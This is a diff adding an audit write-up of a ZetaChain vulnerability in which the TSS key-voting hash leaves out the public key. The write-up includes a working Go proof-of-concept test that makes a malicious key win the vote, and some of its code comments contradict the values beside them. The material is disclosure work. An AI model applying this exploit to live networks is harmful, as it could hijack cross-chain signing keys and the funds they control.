@@ -588,3 +588,139 @@ contract RouterTest is Test {
 ```
 
 </details>
+
+## 16. [High] TSS Key Voting Hash Collision
+
+### Hash Collision
+
+- Summary: The vulnerability described here is a hash collision issue in the TSS (Threshold Signature Scheme) key voting process of ZetaChain. Multiple observers vote on a new TSS public key, and a hash is used to identify if votes are the same. However, the current hash used for the voting index does **not include the public key** being voted on, which creates a critical flaw.
+
+- Impact & Recommendation: An attacker can exploit this by submitting a malicious public key as the final vote. To prevent this, the public key being voted on should be included in the hash. All parts of the message, except the creator and yes/no vote, should be hashed to ensure platform security.
+
+  <br> 🐬: [Source](https://code4rena.com/reports/2023-11-zetachain#h-14-TSS-Key-Voting-Hash-Collision) & [Report](https://code4rena.com/reports/2023-11-zetachain)
+
+<details><summary>POC</summary>
+
+```go
+
+package keeper_test
+import (
+	"fmt"
+	"testing"
+	"github.com/zeta-chain/zetacore/common"
+	keepertest "github.com/zeta-chain/zetacore/testutil/keeper"
+	"github.com/zeta-chain/zetacore/x/crosschain/keeper"
+	"github.com/zeta-chain/zetacore/x/crosschain/types"
+	observerTypes "github.com/zeta-chain/zetacore/x/observer/types"
+	observertypes "github.com/zeta-chain/zetacore/x/observer/types"
+)
+func TestTssHashCollision(t *testing.T) {
+	// List of observers to use for voting
+	observer1Address := "zeta1w5czgpk5kc9etxw2anzhr0uyrr4fqks32qmk6k"
+	observer2Address := "zeta1w8qa37h22h884vxedmprvwtd3z2nwakxu9k935"
+	observer3Address := "zeta1hk05v9len8u0c2xrwxgfknvcskpd4vncm7ehch"
+	observer4Address := "zeta1g323lusfa9qqvjvupajre2dphuem999fahc086"
+	observers := []string{observer1Address, observer2Address, observer3Address, observer4Address}
+	k, ctx, _, zk := keepertest.CrosschainKeeper(t)
+	msgServer := keeper.NewMsgServerImpl(*k)
+	/*
+		Setup various things for testing
+	*/
+	// Set the chain ids we want to use to be valid
+	params := observertypes.DefaultParams()
+	zk.ObserverKeeper.SetParams(
+		ctx, params,
+	)
+	// Add validator to the observer list for voting
+	// Normally happens within MsgAddObserver
+	chains := zk.ObserverKeeper.GetParams(ctx).GetSupportedChains()
+	for _, chain := range chains {
+		zk.ObserverKeeper.SetObserverMapper(ctx, &observertypes.ObserverMapper{
+			ObserverChain: chain,
+			ObserverList:  []string{observer1Address, observer2Address, observer3Address, observer4Address},
+		})
+	}
+	// Add to privileged node list. Normally happens within MsgAddObserver
+	for _, address := range observers {
+		pubkeySet := common.PubKeySet{Secp256k1: "", Ed25519: ""}
+		zk.ObserverKeeper.SetNodeAccount(ctx, observerTypes.NodeAccount{
+			Operator:       address, // Make the same as the things above later..
+			GranteeAddress: address,
+			GranteePubkey:  &pubkeySet,                      // DK
+			NodeStatus:     observerTypes.NodeStatus_Active, // DK
+		})
+	}
+	// Turn on the keygen process for a moment
+	item := observerTypes.Keygen{
+		BlockNumber: 10,
+	}
+	zk.ObserverKeeper.SetKeygen(ctx, item)
+	// List of messages to use
+	msg := &types.MsgCreateTSSVoter{
+		Creator:          observer1Address,
+		TssPubkey:        "Key1", // Key1
+		KeyGenZetaHeight: 3,
+		Status:           common.ReceiveStatus_Success,
+	}
+	msg2 := &types.MsgCreateTSSVoter{
+		Creator:          observer2Address,
+		TssPubkey:        "Key1", // Key2 - different than key1!
+		KeyGenZetaHeight: 3,
+		Status:           common.ReceiveStatus_Success,
+	}
+	msg3 := &types.MsgCreateTSSVoter{
+		Creator:          observer3Address,
+		TssPubkey:        "Key1", // Key2 - different than key1!
+		KeyGenZetaHeight: 3,
+		Status:           common.ReceiveStatus_Success,
+	}
+	msg4 := &types.MsgCreateTSSVoter{
+		Creator:          observer4Address,
+		TssPubkey:        "MaliciousKeyThatOnlyIVotedOn", // Key2 - different than key1!
+		KeyGenZetaHeight: 3,
+		Status:           common.ReceiveStatus_Success,
+	}
+	if msg.Digest() == msg4.Digest() {
+		fmt.Println("=======================")
+		fmt.Println("Voting hash collision!")
+		fmt.Println("=======================")
+	}
+	fmt.Println("Msg.digest() on msg1 and msg4- ", msg.Digest(), msg4.Digest())
+	fmt.Println("Msg1: ", msg)
+	fmt.Println("Msg4: ", msg4)
+	// Currently failing
+	res, err := msgServer.CreateTSSVoter(
+		ctx,
+		msg,
+	)
+	res2, err2 := msgServer.CreateTSSVoter(
+		ctx,
+		msg2,
+	)
+	res3, err3 := msgServer.CreateTSSVoter(
+		ctx,
+		msg3,
+	)
+	res4, err4 := msgServer.CreateTSSVoter(
+		ctx,
+		msg4,
+	)
+	fmt.Println(res, err)
+	fmt.Println(res2, err2)
+	fmt.Println(res3, err3)
+	fmt.Println(res4, err4)
+	// Show that the vote for the given digest passed
+	ballot, _ := zk.ObserverKeeper.GetBallot(ctx, msg.Digest())
+	fmt.Println("Ballot: ", ballot)
+	// KeyGen information. Passed with our information
+	fmt.Println(zk.ObserverKeeper.GetKeygen(ctx))
+	fmt.Println("Showing off the malicious key")
+	fmt.Println("============================")
+	tss, _ := k.GetTSS(ctx)
+	fmt.Println(tss)
+	fmt.Println("PublicKey: ", tss.TssPubkey)
+}
+
+```
+
+</details>
